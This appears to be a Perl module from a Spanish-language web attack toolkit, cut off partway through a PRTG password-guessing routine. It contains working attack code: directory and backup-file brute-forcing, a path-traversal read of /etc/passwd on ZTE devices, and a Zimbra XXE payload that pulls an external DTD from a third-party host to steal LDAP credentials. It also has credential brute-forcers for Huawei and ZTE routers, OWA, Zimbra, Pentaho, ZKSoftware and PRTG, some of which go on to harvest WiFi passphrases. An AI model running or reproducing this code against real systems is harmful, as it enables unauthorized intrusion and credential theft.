package webHacks;
our $VERSION = '1.0';
use Moose;
use Term::ANSIColor;
use Text::Table;
use HTML::TreeBuilder;
use LWP::UserAgent;
use HTTP::Cookies;
use URI::Escape;
use HTTP::Request;
use HTTP::Response;
use HTML::Scrubber;
use Switch;
use Parallel::ForkManager;
use utf8;
binmode STDOUT, ":encoding(UTF-8)";
no warnings 'uninitialized';

{
has 'rhost', is => 'rw', isa => 'Str',default => '';	
has 'rport', is => 'rw', isa => 'Str',default => '80';	
has 'path', is => 'rw', isa => 'Str',default => '/';	
has 'proto', is => 'rw', isa => 'Str',default => 'http';	
has 'max_redirect', is => 'rw', isa => 'Int',default => 0;	
has 'html', is => 'rw', isa => 'Str',default => '';	
has 'final_url', is => 'rw', isa => 'URI';	

has user_agent      => ( isa => 'Str', is => 'rw', default => '' );
has proxy_host      => ( isa => 'Str', is => 'rw', default => '' );
has proxy_port      => ( isa => 'Str', is => 'rw', default => '' );
has proxy_user      => ( isa => 'Str', is => 'rw', default => '' );
has proxy_pass      => ( isa => 'Str', is => 'rw', default => '' );
has proxy_env      => ( isa => 'Str', is => 'rw', default => '' );
has error404      => ( isa => 'Str', is => 'rw', default => '' );
has cookie      => ( isa => 'Str', is => 'rw', default => '' );
has ajax      => ( isa => 'Str', is => 'rw', default => '0' );
has threads      => ( isa => 'Int', is => 'rw', default => 10 );
has debug      => ( isa => 'Int', is => 'rw', default => 0 );
has timeout      => ( isa => 'Int', is => 'rw', default => 15 );
has mostrarTodo      => ( isa => 'Int', is => 'rw', default => 1 );
has headers  => ( isa => 'Object', is => 'rw', lazy => 1, builder => '_build_headers' );
has browser  => ( isa => 'Object', is => 'rw', lazy => 1, builder => '_build_browser' );

########### scan directories #######       
sub dirbuster
{
my $self = shift;
my $headers = $self->headers;
my $debug = $self->debug;
my $mostrarTodo = $self->mostrarTodo;
my $rhost = $self->rhost;
my $rport = $self->rport;
my $path = $self->path;
my $error404 = $self->error404;
my $threads = $self->threads;
my $proto = $self->proto;
my ($url_file,$extension) = @_;

my $cookie = $self->cookie;

if ($cookie ne "")
	{$headers->header("Cookie" => $cookie);} 

my $ajax = $self->ajax;

if ($ajax ne "0")
	{$headers->header("x-requested-with" => "xmlhttprequest");}

# Max parallel processes  
my $pm = new Parallel::ForkManager($threads); 
my @links;

########### file to array (url_file) #######
open (MYINPUT,"<$url_file") || die "ERROR: Can not open the file $url_file\n";
while (my $url=<MYINPUT>)
{ 
$url =~ s/\n//g; 	
push @links, $url;
}
close MYINPUT;
#########################################

print "ssl in dirbuster $proto \n" if ($debug);

my $lines = `wc -l $url_file | cut -d " " -f1`;
$lines =~ s/\n//g;
my $time = int($lines/600);

print color('bold blue');
print "######### Usando archivo: $url_file ";

if ($extension ne "")
	{print "con extension: $extension ##################### \n";}
else
	{print "##################### \n";}
#print("error404sss $error404");
$error404 =~ s/~/ /g;
print "Configuracion : Hilos: $threads \t SSL:$proto \t Ajax: $ajax \t Cookie: $cookie  error404:$error404 mostrarTodo $mostrarTodo\n";
print "Tiempo estimado en probar $lines URLs : $time minutos\n\n";
print color('reset');

my $result_table = Text::Table->new(
        "STATUS", "  URL", "\t\t\t\t RISKY METHODS"
);
    
print $result_table;

foreach my $file_name (@links) {
    $pm->start and next; # do the fork   
    $file_name =~ s/\n//g; 	
	#Adicionar backslash
	#if (! ($file_name =~ /\./m)){	 
	if ($url_file =~ "directorios"){	 
		$file_name = $file_name."/";
	}	
	
	switch ($extension) {
	case "php"	{ $file_name =~ s/EXT/php/g;  }	
	case "html"	{ $file_name =~ s/EXT/html/g;  }
	case "asp"	{ $file_name =~ s/EXT/asp/g;  }
	case "aspx"	{ $file_name =~ s/EXT/aspx/g;  }
	case "htm"	{ $file_name =~ s/EXT/htm/g;  }
	case "jsp"	{ $file_name =~ s/EXT/jsp/g;  }
	case "pl"	{ $file_name =~ s/EXT/pl/g;  }
    }

	my $url ;
	if ($rport eq '80' || $rport eq '443')
		{$url = "$proto://".$rhost.$path.$file_name; }
	else
		{$url = "$proto://".$rhost.":".$rport.$path.$file_name; }
        
	#print "getting $url \n";
	
	
	##############  thread ##############
	my $response = $self->dispatch(url => $url,method => 'GET',headers => $headers);
	my $status = $response->status_line;
	#print " pinche status $status de $url buscando error $error404 \n";
	my $decoded_content = $response->decoded_content;
	#print("status $status decoded_content $decoded_content");
	#sleep 5;

	############ check if there is a redirect (HTML)
	my $redirect_path = getRedirect($decoded_content);
	if ( $redirect_path ne ''  ){
		#print("redirect_path  $redirect_path ");
		#$response = $self->dispatch(url => $redirect_path, method => 'GET', headers => $headers);
		#$decoded_content = $response->decoded_content; 	 
		$url = $url.$redirect_path
	}  
	#########################################		

	#print " error404 $error404 \n";	
	if ($error404 ne '')		
	{		
		#print " decoded_content $decoded_content \n";	
		if($decoded_content =~ /$error404/m){	
			$status="404"; 			
		}
	}
	
	if($decoded_content =~ /Endpoint not found|Can't connect to MySQL server|Cannot log in to the MySQL server|Could not connect to MySQL/m){	
		$status="404"; 		
	}


	############# check vulnerabilities ###
	my $vuln=checkVuln($decoded_content);
	if ($vuln ne ""){
		$vuln=" (vulnerabilidad=$vuln)\t";
	}

	
	if ($decoded_content eq ""){	 
		$vuln = " (Archivo vacio)\t";
	}

	if($url =~ /r=usuario/m){	 
		if ($decoded_content =~ /r=usuario\/create/i)
			{$vuln = " (vulnerabilidad=ExposicionUsuarios)\t";}	
		else
			{$status="404";}
	}
	##################
	print "vuln $vuln \n" if ($debug);
		
	my $content_length = $response->content_length;
	#Revisar si realmente es un archivo phpinfo
	if ($file_name =~ /phpinfo/m && $url_file =~ "divulgacionInformacion"  ){	 
		#print ("check phpinfo");
			if( $decoded_content !~ /HTTP_X_FORWARDED_HOST|HTTP_X_FORWARDED_SERVER|phpinfo\(\)/i)
				{$status="404"; }
	}
	
	if($status !~ /404|400|302/m){		
		my @status_array = split(" ",$status);	
		my $current_status = $status_array[0];
		my $response2 = $self->dispatch(url => $url,method => 'OPTIONS',headers => $headers);
		my $options = " ";
		$options = $response2->{_headers}->{allow};	
		$options =~ s/GET|HEAD|POST|OPTIONS//g; # delete safe methods	
		$options =~ s/,,//g; # delete safe methods	
		
		if(($status =~ /302/m) && ($content_length > 500) ){	 
			$vuln = " (redirect in HTML )\t";
		}
 
		# Revisar si el registro de usuario drupal/joomla/wordpress esta abierto
		if ($url_file =~ "registroHabilitado"){	 		
			if($decoded_content =~ /\/user\/register|registerform|member-registration/m){		
				$vuln= ' (Registro habilitado)';				
			}			
		}
		print "$current_status\t$url$vuln $options \n";	
	}
	else
	{
		print "$status\t$url$vuln  \n" if ($mostrarTodo);
	}
   $pm->finish;
  }
  $pm->wait_all_children;

}



#search for backupfiles
sub backupbuster
{
my $self = shift;
my $headers = $self->headers;
my $debug = $self->debug;
my $mostrarTodo = $self->mostrarTodo;
my $rhost = $self->rhost;
my $rport = $self->rport;
my $path = $self->path;
my $proto = $self->proto;
my $error404 = $self->error404;
my $threads = $self->threads;
my ($url_file) = @_;


my $cookie = $self->cookie;

if ($cookie ne "")
	{$headers->header("Cookie" => $cookie);} 

my $ajax = $self->ajax;

if ($ajax ne "0")
	{$headers->header("x-requested-with" => "xmlhttprequest");}

# Max parallel processes  
my $pm = new Parallel::ForkManager($threads); 
my @links;

########### file to array (url_file) #######
open (MYINPUT,"<$url_file") || die "ERROR: Can not open the file $url_file\n";
while (my $url=<MYINPUT>)
{ 
$url =~ s/\n//g; 	
push @links, $url;
}
close MYINPUT;
#########################################

my $lines = `wc -l $url_file | cut -d " " -f1`;
$lines =~ s/\n//g;
my $time = int($lines/60);

print color('bold blue');
print "######### Usando archivo: $url_file ##################### \n";
print "Configuracion : Hilos: $threads \t SSL:$proto \t Ajax: $ajax \t Cookie: $cookie\n";
print "Tiempo estimado en probar $lines archivos de backup : $time minutos\n\n";
print color('reset');

    
my $result_table = Text::Table->new(
        "STATUS", "  URL", "\t\t\t\t RISKY METHODS"
);

print $result_table;

foreach my $file_name (@links) 
{
	
	my @backups = (".FILE.EXT.swp","FILE.inc","FILE~","FILE.bak","FILE.tmp","FILE.temp","FILE.old","FILE.bakup","FILE-bak", "FILE~", "FILE.save", "FILE.swp", "FILE.old","Copy of FILE","FILE (copia 1)","FILE::\$DATA");
	$file_name =~ s/\n//g; 	
	#print "file $file_name \n";
	my $url;

	foreach my $backup_file (@backups) {			
		$backup_file =~ s/FILE/$file_name/g;    		
		
		$url = "$proto://".$rhost.":".$rport.$path.$backup_file;
				    
		$pm->start and next; # do the fork 
		#print  "$url \n"; 
		my $response = $self->dispatch(url => $url,method => 'GET',headers => $headers);
		my $status = $response->status_line;
		my $decoded_content = $response->decoded_content;
		 
		if ($error404 ne '')		
		{			
			if($decoded_content =~ /$error404/m){	
				$status="404"; 
			}
		}
		
		my @status_array = split(" ",$status);	
		my $current_status = $status_array[0];
		
		#if($status !~ /404|503|400/m){	
		if($status !~ /404|500|302|303|301|503|400/m)
			{print "$current_status\t$url\n";}
		else
			{print "$status\t$url  \n" if ($mostrarTodo);}		
		$pm->finish; # do the exit in the child process		   
	}# end foreach backupname
	$pm->wait_all_children; 
} # end foreach file
}


sub openrelay
{
my $self = shift;
my $headers = $self->headers;
my $debug = $self->debug;

my %options = @_;
my $ip = $options{ ip };
my $port = $options{ port };
my $correo = $options{ correo };


$headers->header("Content-Type" => "application/x-www-form-urlencoded");
$headers->header("Cookie" => "ZM_TEST=true");
$headers->header("Referer" => "http://www.dnsexit.com/Direct.sv?cmd=testMailServer");
$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");				
		

my $hash_data = {'actioncode' => 1, 
				'from' => $correo,
				'to' => $correo,
				'emailserver' => $ip,
				'port' => $port,
				'Submit' => "Check+Email+Server",
				
				};		
	my $post_data = convert_hash($hash_data);
		
	my $response = $self->dispatch(url => "http://www.dnsexit.com/Direct.sv?cmd=testMailServer",method => 'POST', post_data =>$post_data ,headers => $headers);
	my $decoded_response = $response->decoded_content;
	#$decoded_response =~ /<textarea name=(.*?\n\r\t)<\/textarea>/;
	#my $result = $1; 
	print "$decoded_response \n";
	#print "$decoded_response \n";

}



sub exploit
{
my $self = shift;
my $headers = $self->headers;
my $debug = $self->debug;
my $rhost = $self->rhost;
my $rport = $self->rport;
my $proto = $self->proto;


my %options = @_;
my $module = $options{ module };
my $path = $options{ path };


print color('bold blue') if($debug);
print "######### Testendo: $module ##################### \n\n" if($debug);
print color('reset') if($debug);

my $url ;
if ($rport eq '80' || $rport eq '443')
	{$url = "$proto://".$rhost.$path; }
else
	{$url = "$proto://".$rhost.":".$rport.$path; }
        

 
if ($module eq "zte")
{
	my $response = $self->dispatch(url => $url."../../../../../../../../../../../../etc/passwd",method => 'GET', headers => $headers);
	my $decoded_response = $response->decoded_content;
	print "$decoded_response \n";
}

if ($module eq "zimbraXXE")
{
	
	my $xml= "<!DOCTYPE Autodiscover [
        <!ENTITY % dtd SYSTEM 'https://hackworld1.github.io/zimbraUser.dtd'>
        %dtd;
        %all;
        ]>
	<Autodiscover xmlns='http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'>
    <Request>
        <EMailAddress>aaaaa</EMailAddress>
        <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
    </Request>
	</Autodiscover>";

	my $response = $self->dispatch(url => $url."Autodiscover/Autodiscover.xml",method => 'POST_FILE',post_data =>$xml,  headers => $headers);
	my $decoded_response = $response->decoded_content;
	
	$decoded_response =~ s/&gt;/>/g; 
	$decoded_response =~ s/&lt;/</g; 
	
	print "$decoded_response \n";
	
	if($decoded_response =~ /ldap_root_password/m){	 		
		$decoded_response =~ /name="zimbra_user">\n    <value>(.*?)</;
		my $username = $1; 
	
		$decoded_response =~ /name="zimbra_ldap_password">\n    <value>(.*?)</;
		my $password = $1; 
			
		print "Credenciales: Usuario: $username password: $password\n";
	}
}

}



sub obtener_hash_md5 {
    my ($cadena) = @_;
    my $hash_md5 = md5_hex($cadena);
    return $hash_md5;
}


sub passwordTest
{
	my $self = shift;
	my $headers = $self->headers;
	my $debug = $self->debug;
	my $rhost = $self->rhost;
	my $rport = $self->rport;
	my $proto = $self->proto;

	my %options = @_;
	my $module = $options{ module };
	my $passwords_file = $options{ passwords_file };
	my $password = $options{ password };
	my $user = $options{ user };
	my $path = $options{ path };


	print color('bold blue') if($debug);
	print "######### Testendo: $module ##################### \n\n" if($debug);
	print color('reset') if($debug);

	my $url ;
	if ($rport eq '80' || $rport eq '443')
		{$url = "$proto://".$rhost.$path; }
	else
		{$url = "$proto://".$rhost.":".$rport.$path; }
        


	############### HUAWEI-AR
	if ($module eq "HUAWEI-AR")
	{

		$headers->header("Origin" => $url);
		$headers->header("Referer" => $url);
		$headers->header("Upgrade-Insecure-Requests" => 1);
			

		my @passwords_list = []; 
		if ($passwords_file ne '' )
		{
			print "Archivo password";
			open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
			while (my $password=<MYINPUT>)
			{ 						
				push @passwords_list,$password; 
			}
		}
		else
		{
			@passwords_list[0]=$password; 
		}
		
		
		foreach my $password (@passwords_list) 
		{
			$password =~ s/\n//g;				
			my $hash_data = {'UserName' => $user, 
			'Password' => $password,
			'frashnum'=> '',
			'LanguageType'=> 0			
			};	

			my $post_data = convert_hash($hash_data);
			
			my $response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
			my $decoded_response = $response->decoded_content;
			my $status = $response->status_line;								
			print "[+] user:$user password:$password status:$status\n";
			#print($decoded_response);
			if ($decoded_response !~ /ErrorMsg/m) # si la respuesta no tiene error
			{					
				print "Password encontrado: [HUAWEI-AR] $url Usuario:$user Password:$password \n";
				last;											
			}	
		}				
		close MYINPUT;	
	}
	
	############### ZTE-ONT-4G
	if ($module eq "ZTE-ONT-4G")
	{

		$headers->header("Origin" => $url);
		$headers->header("Referer" => $url);
		$headers->header("Upgrade-Insecure-Requests" => 1);
			

		my @passwords_list = []; 
		if ($passwords_file ne '' )
		{
			print "Archivo password";
			open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
			while (my $password=<MYINPUT>)
			{ 						
				push @passwords_list,$password; 
			}
		}
		else
		{
			@passwords_list[0]=$password; 
		}
		
		
		foreach my $password (@passwords_list) 
		{
			$password =~ s/\n//g; 	
			
			
			my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
			my $decoded_response = $response->decoded_content;
			#getObj("Frm_Logintoken").value = "19";
			$decoded_response =~ /getObj\("Frm_Logintoken"\).value = "(.*?)"/;
			my $Frm_Logintoken = $1; 
			#print "decoded_response $decoded_response\n";

			my $hash_data = {'Username' => $user, 
			'Password' => $password,
			'frashnum'=> '',
			'action'=> 'login',
			'Frm_Logintoken'=> $Frm_Logintoken
			};	

			my $post_data = convert_hash($hash_data);
			
			$response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
			$decoded_response = $response->decoded_content;
			my $status = $response->status_line;						
			print "[+] user:$user password:$password status:$status\n";
			#print($decoded_response);
			if ($status =~ /302/m)
			{						
				$response = $self->dispatch(url => $url.'getpage.gch?pid=1002&nextpage=net_wlan_basic_t1.gch' ,method => 'GET', headers => $headers);
				$decoded_response = $response->decoded_content;							
				$decoded_response =~ s/[^\x00-\x7f]//g;
				$decoded_response =~ s/\\x2e/./g; 
				$decoded_response =~ s/\\x20/ /g; 
				$decoded_response =~ s/\\x5f/_/g; 
				$decoded_response =~ s/\\x2d/-/g; 
				$decoded_response =~ s/\\x22/"/g; 
			
				my $KeyPassphrase;
				#KeyPassphrase','675430or'
				if ($decoded_response =~ /Transfer_meaning\('KeyPassphrase','(\w+)'\);/) {
					$KeyPassphrase = $1;					
				}
					
				#Transfer_meaning('ESSID','Flia. Saavedra');</script>
				#Transfer_meaning('ESSID','dfg\x2esdkgadkngkern');
				my $ESSID;
				while ($decoded_response =~ /Transfer_meaning\('ESSID','(.*?)'/g) {					
					$ESSID = $1;				
				}
			
				print "Password encontrado: [ZTE ZTE-ONT-4G] $url Usuario:$user Password:$password ESSID $ESSID KeyPassphrase $KeyPassphrase \n";
				last;											
			}	
		}				
		close MYINPUT;	
	}#ZTE ONT-4G 



	############### ZTE-F6XX-2017
	if ($module eq "ZTE-F6XX-2017")
	{		
		$headers->header("Referer" => $url);
		$headers->header("Upgrade-Insecure-Requests" => 1);
		$headers->header("Cookie" => '_TESTCOOKIESUPPORT=1');
			

		my @passwords_list = []; 
		if ($passwords_file ne '' )
		{
			print "Archivo password";
			open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
			while (my $password=<MYINPUT>)
			{ 						
				push @passwords_list,$password; 
			}
		}
		else
		{
			@passwords_list[0]=$password; 
		}
		
		
		foreach my $password (@passwords_list) 
		{
			$password =~ s/\n//g; 	
						
			my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
			my $decoded_response = $response->decoded_content;
			#getObj("Frm_Logintoken").value = "12";
			$decoded_response =~ /getObj\("Frm_Logintoken"\).value = "(.*?)"/;


			my $Frm_Logintoken = $1; 						
			$password =~ s/\n//g; 				
			#print ("Frm_Logintoken $Frm_Logintoken  random_number $random_number hash_md5 $hash_md5");
			my $hash_data = {"frashnum" => "",
							"action" => "login",
							"Frm_Logintoken" => $Frm_Logintoken,							
							'Username' => $user, 
							'Password' => $password
					};	

			my $post_data = convert_hash($hash_data);
			
			$response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
			$decoded_response = $response->decoded_content;
			my $status = $response->status_line;						
			print "[+] user:$user password:$password status:$status\n";
			#print($decoded_response);
			if ($status =~ /302/m)
			{	
				#Set-Cookie: SID=329c435cd6a1b00febc2f785cf7b76f9; PATH=/; HttpOnly
				my $response_headers = $response->headers_as_string;
				my $SID;
				if ($response_headers =~ /SID=([^;]+)/) {
					$SID = $1;					
				} 
				
				#get SSID
				$headers->header("Origin" => $url);	
				$headers->header("Cookie" => "_TESTCOOKIESUPPORT=1; SID=$SID");	
				$response = $self->dispatch(url => $url.'getpage.gch?pid=1002&nextpage=net_wlanm_essid1_t.gch' ,method => 'GET', headers => $headers);
				$decoded_response = $response->decoded_content;	
				$decoded_response =~ s/Transfer_meaning\('ESSID',''//g;
				#$decoded_response =~ s/,''/,'0'/g;
				$decoded_response =~ s/[^\x00-\x7f]//g;
				$decoded_response =~ s/\\x2e/./g; 
				$decoded_response =~ s/\\x20/ /g; 
				$decoded_response =~ s/\\x5f/_/g; 
				$decoded_response =~ s/\\x2d/-/g; 
				$decoded_response =~ s/\\x22/"/g; 

				#<script language=javascript>Transfer_meaning('ESSID','JACKBAUTISTA');</script>
				my $ESSID;				
				$decoded_response =~ /Transfer_meaning\('ESSID','(.*?)'/;
				$ESSID = $1;					
			
				#get password
				$response = $self->dispatch(url => $url.'getpage.gch?pid=1002&nextpage=net_wlanm_secrity1_t.gch' ,method => 'GET', headers => $headers);								
				$decoded_response = $response->decoded_content;
				$decoded_response =~ s/Transfer_meaning\('KeyPassphrase',''//g;
				$decoded_response =~ s/[^\x00-\x7f]//g;
				$decoded_response =~ s/\\x2e/./g; 
				$decoded_response =~ s/\\x20/ /g; 
				$decoded_response =~ s/\\x5f/_/g; 
				$decoded_response =~ s/\\x2d/-/g; 
				$decoded_response =~ s/\\x22/"/g; 
				
				#<script language=javascript>Transfer_meaning('KeyPassphrase','coins0591JB');</script>				
				$decoded_response =~ /Transfer_meaning\('KeyPassphrase','(.*?)'/;
				my $KeyPassphrase = $1; 									
			
				print "Password encontrado: [ZTE F6XX] $url Usuario:$user Password:$password ESSID $ESSID KeyPassphrase $KeyPassphrase \n";
				last;											
			}
		}				
		close MYINPUT;	
	}#ZTE-F6XX-2017 

	############### ZTE-F6XX-2018
	if ($module eq "ZTE-F6XX-2018")
	{		
		$headers->header("Referer" => $url);
		$headers->header("Upgrade-Insecure-Requests" => 1);
		$headers->header("Cookie" => '_TESTCOOKIESUPPORT=1');
			

		my @passwords_list = []; 
		if ($passwords_file ne '' )
		{
			print "Archivo password";
			open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
			while (my $password=<MYINPUT>)
			{ 						
				push @passwords_list,$password; 
			}
		}
		else
		{
			@passwords_list[0]=$password; 
		}
		
		
		foreach my $password (@passwords_list) 
		{
			$password =~ s/\n//g; 	
						
			my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
			my $decoded_response = $response->decoded_content;
			#getObj("Frm_Logintoken").value = "12";
			$decoded_response =~ /getObj\("Frm_Logintoken"\).value = "(.*?)"/;


			my $Frm_Logintoken = $1; 			
			my $random_number = int(rand(89999999)) + 10000000;			
			$password =~ s/\n//g; 	
			my $hash_md5 = obtener_hash_md5($password.$random_number);
			#print ("Frm_Logintoken $Frm_Logintoken  random_number $random_number hash_md5 $hash_md5");
			my $hash_data = {"frashnum" => "",
							"action" => "login",
							"Frm_Logintoken" => $Frm_Logintoken,
							"UserRandomNum" => $random_number,
							'Username' => $user, 
							'Password' => $hash_md5
					};	

			my $post_data = convert_hash($hash_data);
			
			$response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
			$decoded_response = $response->decoded_content;
			my $status = $response->status_line;						
			print "[+] user:$user password:$password status:$status\n";
			#print($decoded_response);
			if ($status =~ /302/m)
			{	
				#Set-Cookie: SID=329c435cd6a1b00febc2f785cf7b76f9; PATH=/; HttpOnly
				my $response_headers = $response->headers_as_string;
				my $SID;
				if ($response_headers =~ /SID=([^;]+)/) {
					$SID = $1;					
				} 
				
				#get SSID
				$headers->header("Origin" => $url);	
				$headers->header("Cookie" => "_TESTCOOKIESUPPORT=1; SID=$SID");	
				$response = $self->dispatch(url => $url.'getpage.gch?pid=1002&nextpage=net_wlanm_essid1_t.gch' ,method => 'GET', headers => $headers);
				$decoded_response = $response->decoded_content;	
				$decoded_response =~ s/Transfer_meaning\('ESSID',''//g;
				#$decoded_response =~ s/,''/,'0'/g;
				$decoded_response =~ s/[^\x00-\x7f]//g;
				$decoded_response =~ s/\\x2e/./g; 
				$decoded_response =~ s/\\x20/ /g; 
				$decoded_response =~ s/\\x5f/_/g; 
				$decoded_response =~ s/\\x2d/-/g; 
				$decoded_response =~ s/\\x22/"/g; 

				#<script language=javascript>Transfer_meaning('ESSID','JACKBAUTISTA');</script>
				my $ESSID;				
				$decoded_response =~ /Transfer_meaning\('ESSID','(.*?)'/;
				$ESSID = $1;					
			
				#get password
				$response = $self->dispatch(url => $url.'getpage.gch?pid=1002&nextpage=net_wlanm_secrity1_t.gch' ,method => 'GET', headers => $headers);								
				$decoded_response = $response->decoded_content;
				$decoded_response =~ s/Transfer_meaning\('KeyPassphrase',''//g;
				$decoded_response =~ s/[^\x00-\x7f]//g;
				$decoded_response =~ s/\\x2e/./g; 
				$decoded_response =~ s/\\x20/ /g; 
				$decoded_response =~ s/\\x5f/_/g; 
				$decoded_response =~ s/\\x2d/-/g; 
				$decoded_response =~ s/\\x22/"/g; 
				
				#<script language=javascript>Transfer_meaning('KeyPassphrase','coins0591JB');</script>				
				$decoded_response =~ /Transfer_meaning\('KeyPassphrase','(.*?)'/;
				my $KeyPassphrase = $1; 									
			
				print "Password encontrado: [ZTE F6XX] $url Usuario:$user Password:$password ESSID $ESSID KeyPassphrase $KeyPassphrase \n";
				last;											
			}
		}				
		close MYINPUT;	
	}#ZTE-F6XX-2018 

	

	if ($module eq "ZKSoftware")
	{
		my @passwords_list = []; 
		if ($passwords_file ne '' )
		{
			open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
			while (my $password=<MYINPUT>)
			{ 						
				push @passwords_list,$password; 
			}
		}
		else
		{
			push @passwords_list,$password; 
		}
		

		foreach my $password (@passwords_list) {
			$password =~ s/\n//g; 	
			my $hash_data = {'username' => $user, 
					'userpwd' => $password
					};	
		
			my $post_data = convert_hash($hash_data);
			
			my $response = $self->dispatch(url => $url."/csl/check",method => 'POST',post_data =>$post_data, headers => $headers);
			my $decoded_response = $response->decoded_content;
			my $status = $response->status_line;
			
			print "[+] user:$user password:$password status:$status\n";
			#print($decoded_response);
			if ($status =~ /200/m)
			{
				if  ($decoded_response =~ /Department|Departamento|frame|menu|self.location.href='\/'/i){	 
				print "Password encontrado: [ZKSoftware] $url Usuario:$user Password:$password\n";
				last;
				}							
			}	
		}				
		close MYINPUT;	
	}#ZKSoftware


	if ($module eq "AMLC")
	{
		my @passwords_list = []; 
		if ($passwords_file ne '' )
		{
			open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
			while (my $password=<MYINPUT>)
			{ 						
				push @passwords_list,$password; 
			}
		}
		else
		{
			push @passwords_list,$password; 
		}
		

		foreach my $password (@passwords_list) {
			$password =~ s/\n//g; 	


			my $hash_data = {'usu_login' => $user, 
					'usu_password' => $password,
					'aj001sr001qwerty' => '3730329decdf984212942a59de68a819'
					};	
		
			my $post_data = convert_hash($hash_data);
			
 
			$headers->header("Content-Type" => "application/x-www-form-urlencoded");
			$headers->header("Cookie" => "aj001sr001qwertycks=3730329decdf984212942a59de68a819");
			my $response = $self->dispatch(url => $url."login",method => 'POST',post_data =>$post_data, headers => $headers);
			my $decoded_response = $response->decoded_content;
			my $status = $response->status_line;
			
			print "[+] user:$user password:$password status:$status\n";
			#print($decoded_response);
			if ($status =~ /303/m)
			{				
				print "Password encontrado: [AMLC] $url Usuario:$user Password:$password\n";
				last;				
			}	
		}				
		close MYINPUT;	
	}#AMLC

	if ($module eq "owa")
	{
		my $counter = 1;	
		open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
		while (my $password=<MYINPUT>)
		{ 
			$password =~ s/\n//g; 	
			my $hash_data = {"loginOp" => "login",
							"client" => "preferred",
							'username' => $user, 
							'password' => $password
					};	
		
			my $post_data = convert_hash($hash_data);
			
			$headers->header("Content-Type" => "application/x-www-form-urlencoded");
			$headers->header("Cookie" => "ZM_TEST=true");
			$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");				
			
			my $response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
			my $decoded_response = $response->decoded_content;
			my $status = $response->status_line;
			
			if ($decoded_response =~ /error en el servicio de red|network service error/i)
			{				 
				print "El servidor OWA esta bloqueando nuestra IP :( \n";
				last;
											
			}	
			
			
			print "[+] user:$user password:$password status:$status\n";
			if ($status =~ /302/m)
			{				 
				print "Password encontrado: [zimbra] $url (Usuario:$user Password:$password)";
				last;
											
			}
			
			#if (0 == $counter % 10) {
				#print "Sí es múltiplo de 10\n";
				#sleep 120;
			#}			
			$counter = $counter + 1;
			#sleep 1;
		}
		close MYINPUT;	
	}#owa

	if ($module eq "zimbra")
	{
		my $counter = 1;	
		open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
		while (my $password=<MYINPUT>)
		{ 
			$password =~ s/\n//g; 	
			my $hash_data = {"loginOp" => "login",
							"client" => "preferred",
							'username' => $user, 
							'password' => $password
					};	
		
			my $post_data = convert_hash($hash_data);
			
			$headers->header("Content-Type" => "application/x-www-form-urlencoded");
			$headers->header("Cookie" => "ZM_TEST=true");
			$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");				
			
			my $response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
			my $decoded_response = $response->decoded_content;
			my $status = $response->status_line;
			
			if ($decoded_response =~ /error en el servicio de red|network service error/i)
			{				 
				print "El servidor Zimbra esta bloqueando nuestra IP :( \n";
				last;
											
			}	
			
			
			print "[+] user:$user password:$password status:$status\n";
			if ($status =~ /302/m)
			{				 
				print "Password encontrado: [zimbra] $url (Usuario:$user Password:$password)";
				last;
											
			}
			
			#if (0 == $counter % 10) {
				#print "Sí es múltiplo de 10\n";
				#sleep 120;
			#}			
			$counter = $counter + 1;
			#sleep 1;
		}
		close MYINPUT;	
	}#zimbra



	# pentaho
	if ($module eq "pentaho")
	{
				
		open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
		while (my $password=<MYINPUT>)
		{ 
			$password =~ s/\n//g; 
			$headers->header("Content-Type" => "application/x-www-form-urlencoded; charset=UTF-8");
			$headers->header("Accept" => "text/plain, */*; q=0.01");		
			$headers->header("X-Requested-With" => "XMLHttpRequest");		
							
			my $hash_data = {"locale" => "en_US",						 
							'j_username' => $user, 
							'j_password' => $password
					};	
		

			my $post_data = convert_hash($hash_data);
					
			my $response = $self->dispatch(url => $url."pentaho/j_spring_security_check",method => 'POST',post_data =>$post_data, headers => $headers);
			my $response_headers = $response->headers_as_string;
			my $decoded_response = $response->decoded_content;
			my $status = $response->status_line;
			
			print "[+] user:$user password:$password status:$status\n";
			#Location: /pentaho/Home (password OK)		#Location: /pentaho/Login?login_error=1 (password BAD)
			if ($response_headers =~ /Home/i)
			{				 
				print "Password encontrado: [Pentaho] $url (Usuario:$user Password:$password)\n";
				last;
											
			}	
			
		}
		close MYINPUT;	
	}

	if ($module eq "PRTG")
	{

		$headers->header("Content-Type" => "application/x-www-form-urlencoded");		
		open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
		while (my $password=<MYINPUT>)
		{ 
			$password =~ s/\n//g; 	
			my $hash_data = {'username' => $user, 
					'password' => $password,
					'guiselect' => "radio"
					};	
		
			my $post_data = convert_hash($hash_data);
			
			my $response = $self->dispatch(url => $url."/public/checklogin.htm",method => 'POST',post_data =>$post_data, headers => $headers);
			my $decoded_response = $response->decoded_content;
			my $response_headers = $response->headers_as_string;
			my $status = $response->status_line;
			
			print "[+] user:$user password:$password status:$status\n";
			
			
